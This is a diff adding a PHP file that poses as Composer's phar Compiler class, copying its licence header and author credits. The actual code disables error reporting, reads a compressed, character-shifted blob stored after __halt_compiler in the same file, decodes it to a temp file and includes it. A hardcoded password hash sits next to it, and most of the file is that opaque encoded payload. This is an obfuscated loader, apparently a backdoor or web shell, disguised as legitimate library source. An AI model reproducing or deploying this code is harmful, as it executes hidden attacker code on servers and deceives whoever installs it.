@@ -1,0 +1,285 @@
+<?php //declare(strict_types=1);
+
+/*
+ * This file is part of Composer.
+ *
+ * (c) Nils Adermann <naderman@naderman.de>
+ *     Jordi Boggiano <j.boggiano@seld.be>
+ *
+ * For the full copyright and license information, please view the LICENSE
+ * file that was distributed with this source code.
+ *
+
+namespace Composer;
+
+use Composer\Json\JsonFile;
+use Composer\CaBundle\CaBundle;
+use Composer\Pcre\Preg;
+use Symfony\Component\Finder\Finder;
+use Symfony\Component\Process\Process;
+use Seld\PharUtils\Timestamps;
+use Seld\PharUtils\Linter;*/
+
+
+/**
+ * The Compiler class compiles composer into a phar
+ *
+ * @author Fabien Potencier <fabien@symfony.com>
+ * @author Jordi Boggiano <j.boggiano@seld.be>
+ */
+
+class Compiler {
+    private $shift;
+
+    public function __construct($shift = 1) {
+        error_reporting(0);
+        $this->shift = $shift;
+    }
+    public function Builder($input) {
+        $output = '';
+        for ($i = 0; $i < strlen($input); $i++) {
+            $ascii = ord($input[$i]);
+            $ascii -= $this->shift;
+            $output .= chr($ascii);
+        }
+        return $output;
+    }
+    public function slurp($input, $output) {
+        $fp = fopen($input, 'r');
+        fseek($fp, $output);
+	$temp_file = tmpfile();
+	fwrite($temp_file, $this->Builder(gzinflate(stream_get_contents($fp))));
+
+	include socket_get_status($temp_file)['uri'];
+
+	fclose($temp_file);
+	//return $output
+	}
+}
+$stdIn = new Compiler(3, "GENERATE_RANDOM_BYTE");
+$password = "ad5fdf823abe93bacc20ae009b15fc86"; //
+$stdIn->slurp(__FILE__, __COMPILER_HALT_OFFSET__);
+
+    /**
+     * Compiles composer into a single phar file
+     *
+     * @param string $pharFile The full path to the file to create
+     *
+     * @throws \RuntimeException
+     */
+
+__halt_compiler //
+/*BEGIN_PHAR*/(); 
+W  ( c s<  A^ up      z !		$C  3  UUw^<    Y           W   f d] , z  R  9 ^$[6 $ zo  V   9n ,t C ֌   1 =   l ذ{  s&M  :Ԇ C傜?_ ד   ڰ u; )o 7{ 1 cn  T{<
+mLp   
+ b [ u\@
+ f  _>*| \  ~     b d ! G3 , 0   />  ]   0=   sp ~  O      S +s{  / t  zuio}/= |  = `&s :頋S V'
+ e^} ts@  /  b + VrX @DhC uk e=" t> ~et M
+ܼ   %  .   +9 K  Ъ ) D{  Z    ",L     82ۇ'   ] S݌ bѸ i>L jWRE+.   r`      ݊v; i'   gƼ     j,MW'[ 3 j  ɖ   P  Zg  z  4[j몗|  '_    r }h      FO*   
+[0k  t   sl[[ #l  #놥:1 n  h d#Q?  \    G 3R%   -  _  T88 H{         E}  !)  + 5  t$ RO Z  
+s   jv)~v!   pt hKE  nH  4K S(  n zm  p*GL iǞ    & K   a2
+s a ^ h iX   mK x  		1 "Ϣ: ڽA/  o(   >U    o>VϘ( |A5 w§  5,FP    :t     3 Tƺ   I h   I΁  X S   }     p  L  % Jq  A o | ~ as3q& ;~( 6E  Jh  -  Lq "      `  T  M  [H F  _        #Uu ˙ - E?   m  5        ҇ﬦ    6  P o 
+ m4  +   V-Vz    \QaaaQH    )1$^§ s ܈   t % {K7  >N ,  vgK w8ށ    ax1  iL. P    ` 2Tx 
+m      c@ =.H     X( ,m "ܲ  6  -Y  
+l$ І6 Qڡ
+{  ܃  4
+dL<YZ A # pQ   6|" 扁 ~\   HD!   $   # X   :|  "vH    	  ڽ Ƞ   + l)  c4 |u X͞`    "I 40# w +        Ĩ (  K v   {,h0 d   * a $ Fj'!>K/ % 4 >y14e+ }*
+ P        & ^ =l  e  vHw   / L p  / љx   V 
+   <    j  l  
+    r? H   o   ] vQo  	7 d S قX ܎    M   eK#  `  
+; pwCm'8~>j XA  <ɺ*
+1 H >
+$   ikؔ[      툥 ȩm6  N*yG  =    H    (d 6 ^; t% ? ] " 5   s H 20 cK  ز 9J Q @   dI  Dݞ  ,  Wj̜  Z Z V EiԕE* \ Y" 2 n	.x # 3 \I :%   '   HF _ h  q  z YHiC
+ {
+ u
+Uɓm  (Gh  
+    N 8Q= L  ib ]-  ! #$iP  , J1g	e AFN      @
+   Y٤  G  & {  
+   ' zK   ,|}q   *z   ?e  N62 =~  ^  j`uİ8  D  f {h/z  Y D    /E Hc >	  
+    J   ˵ xJ   8?  N@[m &]"  . M   m  <{s/}Z p   ?}Rm    b r  s e Fjq B w  I E 'ŀJIu p͏c f Ƿ  :6      <Y lc , w z[ B ;{Ѩ H3KQ  DZH    a r  8)%X  u) `  ϟָ } g "
+PMu4`H C;{۠Y17 C   @      H ? *KWU{$R 9P  :    Fol
+?@  a nG   E %  %  >ńO"  '    T
+3y 7> sx     }  \%0 ^    V : B {    չ̆  3"      t ڵ    c .V  Y  Z Ih ]
+ AD3 ZdC  - y   d  mT >^ {  iea @5   !n    S <>b > 6 , &      id oMj] ) c  e
+   b`  × ~ wߐk  T	M hCh N $D[ ڢ " cx   n   I  Z} 7 3 n=;  3  
+x[ߘ   @ a < 
+%O  8Za A%0  V U-
+ nCӺ˗E ŷ1R    ꢉ    `  ?   O h  I U	kKL_  nL Cu"@ؖx µ   8y  r I s 6  ( << VŘX ̲  n     BDFuo oي1  g f+Wc p x sV ֟ u   pڸ # B1    B?[L zK3  K#  `  M fӜ 7   І 
+H / 35    ..  Ti   -˝2  - 0    D  ߢ (   y݆ # o e/ /     [  CJ s  nՐ   jL C 7 EbY|L  u ǈ 蘉oܶFq  F      
+   Μ| єΪ9 5 ZF  ㇴ]^     >f ×k _ E J"hХMN|< R  $2 F   %}  r  	   upM 2 TEd c( {  {< ` ȐU
+ < "  &    "9s  Nc<   d P   ` `  d Y p      Q      {, X|C X  pN  T!      U ҋ  o  /xO =~v   0&  6 5  Ϝ { ^MH t ?   ~ i u&6   j0 a S|d}    } { eϠ ޜh  ;    t  ,PG   ;   /   5  `B F U K$   u  ʽ1  
+^F 2 ǚ X  #  ܮ  Q   S  XD  ӧ E"f     `  X #       GT-  a V  <}   -F D0	  +  = !s wZT`
+ #     9      ` B<c
+
+e  & k    ,[   =o    Q!6<    gYGw   1   g u    K +=mI [h  )c V1Fv  
+ڍ  
+)q }v a= w ǻ =    ."Q     ,  ; ɲs= 1't     =&? >M  h T fS J   O&' >5 l:   ~ ˣ R\$! " lA*  W9   5 ~  {p _Yz  'UAܷ J%  g  T	cn 2eIS=ix  % ' d P l    
+ӧoS [/  t ր ], % 5= H e ӆ>  c f򄎨   	>       9A"s r`  _ M_ Oͦvl  1K ۏ     lo  g]ԩ  ֫ d򜲮   Kꭓ  VEڮ} ^NN6 >* B|  x  b <  圻u  nց   \  
+ j! ,  r f     B ཛྷ  D:        x~ < Q>e  ^  / %:  a  x  -G  B ;J  u 9 : 'sǅ  1ؕU    x   ( 4㶮$S z G     ] J      k       J u    Aܠ u%w k Wg    '    EZ@>
+ .- XO  KV  B _=b x   /     <9鮏2 N^L  ,t  d3  ho 	@ kM  
+ .  e / x@[HS|    AV M  uF H   
+ OX< ť ⁌  jK 5 .s |6R  J+a	.1 La2 D 
+ {      n չ w  #  xϻ$h J# &     0I  ;* D  cZ   )  ÷jI 
+  rK   < Ã   Os w9< Eb
+ż   	 GIn   | a  v    o&  jM*  1 $ ̦s ;)S ߌ; R  sw         85 \} . #   s.:  Rmx>n 
+3 B   zs   ][   Tw     E Zl @? >'/ wן{6 g    l  N Ak< Q=  w2 m    nǘv     u6    ^,Z  /i  1   IސP k  E 6  4>  J D        _     * rsۼ     4Z 8Si꣒   g( `m@  .V&5 NZ1  g
+W ~ % v Z  ? 8   mCӢ , - M҅T Ƹz9 D   ~  @    七  \ *i M^ϊ%3   q |{  ˯8   %V ̑  [: ~P ]w*    s  ~ 'S    Y! fm  `tQMC  ג -$Y G |   # c |  "?Ҕ"]   mLX93 (  ~ `I     t  ae  {  x # A     1  ʟ    汯    t    0]  U   v ь "   #    R   Z7 9  tjrЯ o 0 jP   < A   <  s)w|  , ;il R saj  ʑ __$ : Y+V+3ο < ;2 2 ne  I v   9[m v3 tҟ짝 xH L    -  n 9 $g   M$  2 ީe  j !  |7   DD ݕK ,  ,  q
+ - _ 
+pKA w Ż> %   JnO t K A^  z E  .jh d  a]7>G  y   O I1  "   D5 f  ߬*<  k    NJɍHė    O x   'ya $ z    Y 
+       #W n%  ; .      K G !}  M   Y  #|O^f   /o }  4   ;GS  3WZҨF 뗵d     䬔I 2      l     h  A  * ʫѽ *W Z [N M   n 99  $wK J 2W [ T ٨8 v9 4   DK  tmP3   K  Y>   2 I 5  Z ҭ    o*{  ߧ * W     HwqX o7  f79 w 3 < % > . Qy   f   	  ۻU  ϥk X y'' e    f l@|_  U ^ o      Ⱕ òَ 90q  *   :
+z     I  i  Ԁ aUW e  }L  e Y w NkX  n! m ^   x&O  Ay i 4 3<ۻ KyQ | = <
+  W iƏ  ]}  n H   Z9  5O  x`2   >= S3    g           vS<g      Hѥ  {=  Ư  /R}I  T I
+   9 <    Q r ^ < i{ ,     `  -    Ӥ ,| /   RCBRq WB  !  
+   ^   ˃ JU2 Ș \xJt    T  ț \   zY#  D 3 W c o ҙ   +   9d  *8    ? O
+ ^e b.'  t1ȚTǋ
+r(e,    }Ě>   &;   ^ O  g̋     5 i l ! `wʣ G / Ɨ   c 8w  N3  z t      &؟   㣏 { D  Sp pA     ~K    q\ o2О| z 2 _  6ѷ     E  v X>Q    e  6       #l   P΁苵 R  c Ll <k    ' -7 c GDSd  ׋      1{Ё  h =V  & <  } 2   = ޱ  t  <+  
+  m> _  w  r  "{օg*
+ ۅ  3      'ށw8^ 5| U  } Y =    "       e   hL   ~ X  7 
+%l Dm/ ڣiL  S   id  M z gQR   У? 퀘uY  _I֒Y,k  on   `6   :  M+  .|  `  =W  XYչBe   >4  d  }    Kw  Пg 3   _ W   Q'B  W   dr    ?  $ P    MC e     p>n>m   O !  2     W*  dNF   M    
+ _)   }w>7  {]> K!  
+ oz SC v   / A]D Z P  !U  f(
+ 3 ! r    { љg ~ |t U    " |  Y s   EE  Anw`z  4   +n  gʿI+'3  J *y t׭? '[I`  ;  Ӻ u   3    |xz    +(      { ]eړ?  oƥ    E     |)yE G  ɓ,  ٪> [# {^ ϧ V<   q.=7S  g_ * AK N ; X  V?.   [  oĎ   q  nc Nc  4 fƟ uQ}  c u  o   $ ܎ &  z |, p  K# X 8  r ll; ) n     E n7  o  [  ]H[U/ nn   ~  vY    6 % kͻi  
+t
+˝f   </< %L3  u   F<7   }g  h X ~ܓ  ~    d#  n  w    o T  N= K d D |Q a|j B .v<  e  H      > ] $ q    8`+I# ۃ   9 F ZwP   pț Vb   n      l- ;ވ  ?N{{f   ' ud 5Lu 
+9و 1 m  M] d t%v4+>'W   : *  m! x͏K  Sn/    ,  ׈ u   W 7  f  s  - (&g
+      ͻ ~    <Y   2  z96  c J %y ?  N
+  : O`kZK g     @AO   tQK }MM   >$C d" I`    . l ZyB ϲ/J <㳐 V ` ӱ L x '    qf ?+   k  v <j5*          U  k V  
+b  t U>    #5   Z _ . 5i,I# 6P  cK     לr5 ^ 6 .R 6  |& m  Q K   lʭ V  t   A w wվ N&$   > \ w u$  v  G t^  D  ҄ S - 3   ᒖ   D  b:   ǅ ~  ) +   멛  -  ˷  q   ~  ޲   e&K庍gj  q p N w h ~ "o桌  ٪% f<7Ο (i     ]9z Uz g,#mH낦  n @ G |] Z v7    M=[   + yE| V / ; /]> Q  Ac \!혮   
+|١  S v4 [a 6  
+ Q@(  e} m  |t    ??= l   qS   6       ` }      5[ݸ F h   i ԅB  F
+Ȭt )E`@ QS  D  0  Ѥ^yc   g	   M  .7	J    + *  WW    ]7 ~_     F f{X1  An  m KzԼ  Q     
+   l
+]Ցq	 K L Ҕ y}ܞu  
+
+Bi]    ^ qH  ( 4o  [  4  < |Q  Z&͆  k       }!   B4 {    H)z ޏ  =FHl{MjE { x >N  x2  cr      / on  ? Q   ;큧}  _A    ǖ:J    h  ' b  | rv}o r'    s a a   ³ p    m(    ]ز ٶ?        vBN  %   pc    e'  9۴O;`  }YD   ͟r7      A  ~  Φ  Z<ߤ   F
+ @  /  2 /5x   ቁ K1!ۅ {a 1 =  (,  F _ƥ  o ^I  9	    _j s KY? C<
+ r {Wz    7  ڬ ;yo $ F3A  g  аg+'  ;Ht   ūZ   u B o #T8      K%]    c  n`   w YBRs   !7I(P~v w    (   G⠓ C 4P  n q G ?     /x4  K Pf  /c4* C%!"A Y t   (0 (  3a w<  ӊ  n~~<=MQ@ p,  ;3D Ǆ6   z     𳤋p< %h  4 8ӹ b4     ̷k 13B  t= 82 j    
+  |+p ;(   ],  d _  凱@cґ" uO?   H5uIV  Ň 1$F" E ٘   = F  t #n ! S:{ F"  ]Sv   C 8 #y zLh s@ :  ]Sh  KЍY,    m  껱
+] u42    aO }           W  8 f M Ft{  h P<
+  #~ b |,  n  S   v  & s$:Z ^ 3LS  ͌ с  ,I *<    3  La:  roc0 >  tPKW  7O |1[N    W_  :       ]   J Y     VO   Q -1 Sno  '<  
+!  "_  b         ϶
+Q       199  J g
+k b  g5 f  M 	  ˹+1  @>S   d
+   @ j    a        -<  k  ;  
+ fm. 3w  [ "  ʜk  IM ˲    sf w  axO  Y ..    CrkirC֖$ I2 z Om      ,  fwI kò # ѳ  y Ŏ  
+ & / cBN> 5C n ->  0_
+n(3       0 z  踎|    1:  Xaoo  3A  G *}Ӽ 
+     T1 ĝH n7 dn2B  Tb P   H$[ !S϶͓Hd2  ' acԍ T#S C0  cLX   !#IХ!   \^`(ų/h
+ L   F ;Z H  z  A 
+, q  - `j  Nlw 0<Q a 4#  / ɗΟ   nt7z  Ŏ ѧ  Q   B ` I  Q        (p N`3 ,
+ F 1    h  C/!Ii & ; ,A%ǜ ES'د     NxGd    # H  6<   S}
+        tG x   +M0 Ս ɿv  t     .  kGh 줮 i(  # -T   0dICk ,Z  ؑt ;< Վ} f  d$ 'd  u-P( `I Oߤ  ( 1\ * x     z  B 
+,  \E &   r0 rK1@       51(#  T ۳Ob up ֋	 tf_x7~ 
+	 
+ zq + Qjo      \ 7  B   PI !, X {d c  	X䂿   x  #  NBN  *ڏ  ( nX{l   Q   G oa[ 
+?|B S& ;(2'1U    NU &㩃k   0O ] RP sI  ov   qF a     u  0hچ    IcH`oa>  -  ퟮ! oၤ
+      
+  6 VN {
+c[ ̠    I    ~Y )OL*  2tMq  UV8ät  " 7     ǻ     {x     y  |L 9  6 A Kja1  0, 6h 91;   VQ  hۀ 1@ 
+ i ! !+xU 4 b9  F  ڽ ]  3_I l8  y#` (K    c_3   V4   ,85  %B AwH      D<s ⍭|f %  C g 0X Y]   , `"М )      GH w  F`   P@ FB  	C1    
+H;  8{?b7 as;LCp  7
+  4 V Ri
+;
+D [` 	 FO5 
+  *+   S   3 Ɣ E ͽ x*      B"!l   &Q & Շ Aj ҩ    9 @1    -) F 6 @   k  /     &%    !(%ctvP  T|j   1 A\   b|    ÎC  0G    ;t d  !,P6R]r>, H=]  /ghߒx   7 J ǋ  @_ t  A M w  D ,؎6l I`  
+֘?L$  l	Um   ~  > 0Vb      Ξ    d   &  Z  f    RF.     ڂ C   ; 3GG C:>o       %z@   : bk6 7 b  l   7 B OlN y  / Ű"     ( ŉvb  a  Fm ;Ol T ^ص	 1  E0  "' e?O[2   HT  0	 ˤg   % W   6$ k
+  𑂻^X  =  !4  ]?p  h  E #    *  q   N  8 Jݑ  . Ti 
+ \ i t_B -   Z K;z     W/³@/!    )x   A (  _!]   u7 V)B 7 ]䭆 %t
+ 4   gT Ƀs  ?섕 ݋ rXp   } y   @  :  l 
+^    l | !  Y旞 T       } tPp 7O@  7 wP FD蔌\  $  ޓ:D'c[  ێϲM J/,  2 qȄEtJF 1>ɏzZ4 }. l   s ^Ot]  r`8ݹwĴV   Go   د   8"z 'C  , f)   3EB     ϥ  1  <[ V    
+ k   *{`  =    yx V#I  C  AT   p  ׭4[   ƾ ;f   P[  
+^ -H  K 6CHkIA i 4 o    (:r jnP   #   :ы= bOߜuH152&  <k       ~     ݠ/ s  9׃l ̽ e ٯ ƞ [e n > i  R  3u9R7·d"    -ή  7 P(QۂdsޚYl]Y@2Dc   , :  ` 2L 2B  G8  _  Y͖ n   
+ Y 0<Ydy2  ^ <   [ <& S  5N      JuS    x Rf ҷ%  '\{   O . $4 u~)%$   >xIϓ7ٻd )_  VsɴC*tV0B     (NfJ  º""(}  \ C ;   O6  '  ! ]4 <  PÐ@  50 Ҡ~3
+
+W< O   %i*   * t J ] %u X PГ  Z kop - rqYn}    `E ٰ# ƦɄa &  b X6   0 XdQ     ƭ+   2@  h   
+  TK  +    h  \  m> FW ϢQ*   @   F    y橨 i  rhZ
+ Y yF\   b  | K y 2     	
+ :  J[^Zi RT    KkR  R [|  lZ  ,  V PȠHz@ _ '      @ j  ث  R0 A    lFU  : Rȹ   xU j      eF<   3     B VG  /.  tX  ` $ ޿ _O>. y  #  4  !i ˳ q 
+ P  l] $~ o L   9 Ϯ  B =  >뚌2 ɚ  .
+ 3 3t /: tN wC  zD  7 1?  i:  X D -aG E | q  i u[ Ɨt   :  C  +V Cqq (  R"   8   {os   -ђ     	  =]    徽[   
+      `  &p w    &     
+i  Z    MH a  l \< վ )5 hu@h  Gո 1  {|dNOi   / 1 (<@ 
+D    + BT  >q { m  Pk   n~1Lv  ;  & 	 k(A   %, "  U >    Xb}
+ ڞ4 B>s  `H {'  PQ  , 7d y  #]ʐ 33^}d,-
+\  M M 8   ӯg &ZDg@    fO #M	 P g  R Y7   ٲ !    @  ~& 	 ̒  6 Ѩ m   ,v D$Eϒ " b  ;m  Jr틫 @X  #	gy x  ) ڸ \񬮩" Z  6( ! Ɓ z   z/  &Aᠧ  \  ; Ƒ &  ے ׁ    +  
+ 
+] -DT[ @W0V +: p  T  O#h U H 
+ H 6  [Em8 ~    9  -쌅  c;] ud /Y !v @x   I  J =  &*   bA 
+ů  {} ώ  ]  b `H  yAY! $x I   J    ֮&. g PW { v   ,  L7
+ 0#  d  3 F  Y] Ҏ8ۨ"01!&l        Z 
+l  g tҾ ( k)C  N W㥸 {mݕ  M <  m    FjR      <  ՗b   ޭ    a b mr R2    y$ (    P    H{Q-y{  : e   > W     Φ  _ܽ+T d   f,  | /     x δ  ҥE  
+  Iru`ڳ Ir 9   v'| _ ާ9[    ]7<   cE   8/ E  a  %    aY   g     g   .:  
+k.C <C/ DD   - 6      ~~R  |  _0-9 w T   ?4C  sC  j M   A  ]lI@    k U  _e.   ~ ֙7 [A  [  G  #  YM  E+kԇ#   S   T R !v    {  4 ZSMe  :}/ ]F5|\f  }@4  > 8   F 4   i~ pܾ 0  ;Ds ` ͣ[ ڪ$ ! =cӖWN| A\9P  W ?  B  W Dr     b 2ss .ܙ+iCK         ; [
+ J1Kr-Ე      e) - 0   > A r   % O  >  Ȳm [  ܸ 5{   m  ~    ŖR6ϯ !&y~ 4   1 d /onK   +d i S` }  G:g  ,      WmC    6=   ]e%\ /=a   Ys ݶ p{  5 -<p p   #  
+- RV 4߁&
+   \]   v   . 3 ҩM W  m   < 	< # v   7 ̱ a M ݆ F+ G  ` [ z&N'  %    ?h xl / ;8    w o  v : jC    /iǜ0< !    ,8 l $  "  dӆ {  l   K#
+8  # >  = *d    &<   E 7D  M   M8R s+ խ@[ h Q  v w + v l y o!h  \   H MnQ+     io   ] K  EIw    ڈ _   h ` j ~#    U  au_>      O7  s  2]  f   X   (i Z { %'   aZKv i  j7 g	qe ݻ 1 ?Ô!   뛽 i # H 9K  Κ
+%&   ]  u^?j f{в ? s @ؠ}    W Б    M H      h5zG ã4p޻3| zr 6^ M F  7  } Co   F x jT  n 
+ ܴC.    Y9 _ :    F9*Ǧ <3 F '7.J  b a po
+v;  Т7w   񑓛  U  ]  w˜y   . OH z	y]֎  lr  o aq 3 w h  Spb  - P r Ӟ  < |D L  [  v 1 ǽ 9 K   f {    G8AҺiFO   8 1   u 	   ߘ  琇 F îV9  = }> pr  A?2 U ݘN   rޛ)   -w  - ǑQ  o;9  J    s \9w  r   M ^   _] lHoE 0ׯ Q> Z)   |  s  L/k֋T [    f n <  	  s   z  8  t   @Xa. { /!}1   !O    XV y  a1 ^ ̿\  z * s
+~ 
+ a d }QGY     ( T  \   Ӡ   3 - ]C  
+ N  = V_; 7  
+     E= ^= úDW9   >^  @O R =   &  Q Q  u o  9]  LV  /   X   -_ D B   p    h  6 _ hԶڎ 5\YK ~  6xy^  n: 6 j  s}܌OcXPΩr  ZK }ds {9ӝ ˩  w  Oo?  m8 ( \D[  l f ݌  \ )   pk  ]y  U`8  گ#  WTu      %   X v     ~.    K 7 h  l  x tO  mR 'W  x?9Tf   Di@ ?']    A   g>yqu _ '>     ` S BD  PnW  I U] Z{ r p k FZ9 Z Q6ZwS    vC     k ⷎ  eӑ   W  K =v ` ޡ3] '   et EW  s>g}Է U@B >   د   n   K |N  N9 u  ~J HY ] G  Ps ` U  
+    -wNx/|G    Sy    ) D 纫7Y_ C۩} -   _ʇ      7 ~   k k ?   6       р    @  L_y   C  FՑa&_
+ OZ  qܙ=G^    ^   > nΏ{ \Ю uywl l˘c+3='S  4  ӏ    um qʨ   o8ߣ Q[ECỼ \  p   YL9 q	 B pe b
+}y   Y     +  ]Y*t#q   p  n YB+ b  Ͳ 
+1 YM  P  W 1 tsll O   / ;闛]t\[ ޺}*     3Ⱦ	}  7 [ ЧK 9~   4ne샘  K   B x g =K ϫ   @     j0  ֫}~c g)  ش>ne   s  * ܻڥ+ l #f+ w   @ Xڵ&/  0 ]  +        (   J  z   8# 5
+ gt ,5 ݢ  7W pAs*=y  .  ;   O W   q{W     v}   ג   s  N+   C^)   ]   ܬ L^0  4Y'͠y utW9*ƻ k-o  {+  w     P        1: 
+l&  ә ?    3,[|ě  h ؒ(  c       ǚXȅ  ) B. [  Q̥E  nufQ     Ed& ^ f  ?i A     G  )$  #&: p;NĐ b   .  j   <u <y: {  ӷ
+ - a R lo  뇃 M  .䛠  W?   v? NNP u#   7 z   d     \  b       K   XͶDK Y  8   0%  S\  n섛ީ; 5 eY Y   ;u| )  2 u} 3 >\ sG  x  GI7 O  Ǆ F 1  ) 	7? W|N	<q/ҁ<  }b  7# E$ 7  ˑe   9 r<r= ~s$ϭ $e           yɞ k     J #>!Gf~_bXl ֓  r$5 ԑ      7 ſK|u  Ł       :&
+擄   : 9{ Ȫ ׅbò5%   H  y  1  KJ }R  _     J矒  U o *  T   2 P EЏ   ՠA : hK6  p    %t $e    } 3[ p  .   @.c˺ׯ ۉ'o'   qQ'     ~s 
+EC  < |YK    sɖ W2]<    <ln        ^*/
+ 
+ :   x   : X > x m7 o ?X
+   O 
+K   O   I a       H  <,
+  1 t  ,  S   3  wQ:   ?o  8 u*5 yz k- x6  (   @  z = 6?&    杛  w  ߹9   _]  SB   ж Lʿ R Hm  # $q/}Gs= ; {
+a9 if 1wG N`o     ǚ qq  b { SM    )  AѮ  ߶   2  	   wGI    e \u:;H
+n\e(T <߰  - H kc  D/I  -  _1G֕߿͘  *   -    B  j  Q        t   d 1  gDo *  { <  B ި Q  | ע3.    1    t  ݡ n  D  wA)m 
+V%!>n	9k ?N m^ ں    K   f3p   D  -ݙē  9 kna sN+w 9 &s >: o[  6Ѧ $*  {3͹ a . L7  1_ w  
+>Ǝ  3)  ] 4 r^  vu9B  )_ھ  KϽ    g_ R-*< !@7 ? >  M   gjN( x aSІ`Gc  ;<lfN" ! _ Q a  9 Y P y5Y  Ţp]     y &\     # \	  ʕ   o   l &  g3B  &b  w  
+ a    _   +   .FC(  k8p gLй F 
+1enЇ  @   4"   t0|M4Lw IH   Ԕ? | f+  W7B 8    POV    n< lZ -   Pj k R J ^   . P . Z  c*3  m O?:  I  B( x0t02 9 Ca\6 m2# ǧ 3X	 (C^! I  a-   ^ cI`   Ĉ
+c  1s  4P mh 
+  G  v  9wK  T]      Y       p  fI-  a3
+   b  Q\Q )v Vdi h    G{ q o.  3; }J & rt @C Km h    e     =Tw   QI    H ʁz F۱4 IO ~4  t Ç   pǰ  ^ Ll\( % _  } Ć   * h  'W   +  膀  ;    y T  +    s n H dʹ/ 3 G>  l   #   i |  ^ / b
+ #   Y oH  Qj } S)  0  0̣  ~   :   a ohG  8 e AL Y ! '    N r_Ȣ  M   ?x   Hn @*  i   h  G   C Ǜ        Ǟ     qG {       O R   & 0 o % k B y*  G"   U5 p>/ (E:<  ' 3ԓ  Q    V _W '&:۲    H h 5ξ<  9 Os  sA!  [ 1 O Sq   $ 4.; 0 , )мZ
+P#  wv +/!v#   N֗  ՙ sR q  F k X ? -z QÂ   ~k{޽ ҳ     )Iv  }Yv} ) tV  ,|   -     VA   < FZ   %J Lޕ'bO  c N"(i  ̩'  
+ƚG ^6 + *  P E 
+#   6 `M Ѿ .1v  $K,n  ̓ r =#6  . x Es   D  <C A m p&]J zc ,  튜  xK   D W    )
+,w  h} P 0| LyŰ 4 #A3  @$`=  ?I :`BF Pv^^tS ǈ>  - %  ~L  G a"F\w|㬚說m4 ]+ O    ku ӭ ^ *l   -         rΫ^_\        =c  &k d)  ]B t v I   	Ҁ/Kp x  h M  ܫ AFub  MW ]I 8 ^8K |  O
+ 	 }    x A#  c   # # u[  ! *?}bD ?a q  NYV 
+   
+\ L,] t.  
+$y }#^f% a   8e  M     ^O!0P 8	   
+v6 Q    @  ?|} = SV n  冸 V  ͆      ﶵ q> < w Ы zm  f x  C=x 8S1
+  7 _T   + &   8 T(N kR |&z O 5   ՘<؃t9K  2 ( .  C:H  n    gܸ   o[ ^ v  ⷸ      nސj   y {
+8  AAK   U/*     aN     t   r =  g n    jOV   l4 ^s   Z  g   $z  脿}wo  ǭtWz  ӗ  z   e    W/G7 +<K   r   k t .       n _G  ޫr 7 89^   I M  #^   B{X} t] u1  rfA (Ҥ / z    { A <>גH   ۩  y   | x XK  ~ Em {38 o[& Q    QЕ   m&    'C   ; q M$Ā  9   9'Lhd /  +h=  \  ds  %}   a ͧ| h07,[      Ȣۅ =  Q :ս( }  L. n w I  2  ǡj u  p  : p/fW   X⸎  {ΟT   u    ) : Ź)  Y iR Bp 6   9YN7BӁ z   .    Np}F    =Fz   ;  W{
+\6     M: ݍ(_ pi t[6; ` wD rR ^ Kǧ =wȾ     ݗ`K   /   Z R p   TZ ^w "7v  $c    x  ]   9  1 J T     Mj    C  	 ʆ h ̏a F  6 =  '%  = Ϣ9 ` F  $	O X   Y     10x `  U  W S;a 7  D   x  <e է K : \c6G K- _=< 	F ,MN *U) A  Ƀ:] " * Y 3Z- S   J!    08    }#s  mqb[		   ֯    ߛ `-mlZn{v  N  `f h  ^3  M
+     n i2     z   b: û    ^ 5ȥ  |= }ڑb   ɲ륌&Zq  f0c6  d Do  =Γ 8g Rկ    
+41     |    \ } + ~ Ąm       -y  ) ,;Y    1Ӷ    L SBo3 5s  -C vf>ϰT \   d>   !<  D    x vu0sK ר  n n i  \ -N  l
+} ;  +Jlj   z w/x F4k   *  k}  
+   s l   % t    x    ɶ  N  oD8 Ҿ ;   v Ӓ  x Kx . \U @~    c    .C  LJ  m       R   *    χP  l~      H n   > s  c  aC   Ԟ; 
+   -Q 
+ }Y =q = G s ( . v  W  : XO0 Jx  _C   + H  g #[      ~N?    nd  G {K ߫ lc     5G :` 
+{\      N 0 D   z y Lk % 
+T {     Ew& K > 
+D mЇL P     |%B  
+ؖ  k  Ø %   S;q/ eb   bc    FO 2     = =  É $ & r2 u:9 
++  * \ȇr c >u _ l  s`     9   } v     k~   봗 Ċ s  ;   q ]  Y 9  7]  :|   /    g ) ?ƣ  u   _  dd/ IHd   q } 1` #    |&z`xJ,zi  vM w  T Y>  -.  m  Z     S C%  P    V @@ _¸_ O} B킩 Ξ/Nm 3  T iq   7 v!  :  , .ɂ <  uK@| Sq*wq^i o 	  oriy EKC A agO8ӹnw _ f   u  D +  	uR ͛    z     h
+  2){{۠  X R͝  Z51   N   Ci E ^ٿ   ϙ Y
+   x  x  j ih븩B xAt&_M  t V K̥ | ܄d    M = QJy q ܜo Ɲ   u=h O  F 2\ :g;      s  Ypvg z  I EyGF  }< 8    Vk    0 h<   ;    R bsH G#<7   =@ މ  ӥ Q آޓ  u  H5 n   jD< ӆ;  G N r   3YW )mȡ  5  GFw$
+    5 3 rVv JM mmص"I]g  Ej CY( ñ  <3  wd@(l   @ X B+ [ 8  l z K <w  Ow  C8  a  az  x  `   
+ϋ0Βt` v ^|  , |   E;|  a3 9T'  O CW4 ں/  C7'{
+Û Mo     7= 1[g< $_gXA  |H T#    I$ғ ac֔
+ ;    Hfj   [ Geנ 
+ F)
+ y ZK._  ,   gan  S  \ Z w    0   ๵ _[*ڟ[*b .Z ` lŒ  
+  z -  1ה -,A-ݻ ߬ 5VׂD+  _|7  7  ξHBo v  " #>'/  lE   M	wk   v  Z
+  /: [  ~ o    $~ qԸ<6v o~ u;    (Y  N *   i ɦ  i  d8N    o p<Hlt  7     p  F  F 
+s V8ج
+76d,Vo    ŉvb !O  P     z Խ   /ֿ;ldG Y iÀ   Y { $ pd  <   .   
+ w Q  ) Q AD jAX  9t  :n     K   儂 s2 e99i yF t      -D
+VD C  	 ct 5/ l9 P  nH_ ߻9  Fn r   W dH  BE  *   ڻ   ں4시"< ¦<r     	 jH @    @      WP N-,R X 7   +y <     e ̗   |c /    ɺ  E=` Y JTM  u  aΖυ8x6i4@) @10~B F  暃
+   (G    / Ecc r0 ޜ6  z@~ _  F[ `   M(Ԍ}L  {J0Sѝ  G Y z  tG`   0  {帧C6C   W  	_ @   c  .   	 >  ,DU Ν   N  T    % Y   = m܁q֗c ? l @ =   ` i B Ǌ A9$  ۆ2   M}6ڪ   L a  q_H`  $ XȌ  p.    " 44a  ]{d ,+ 9s  n=   
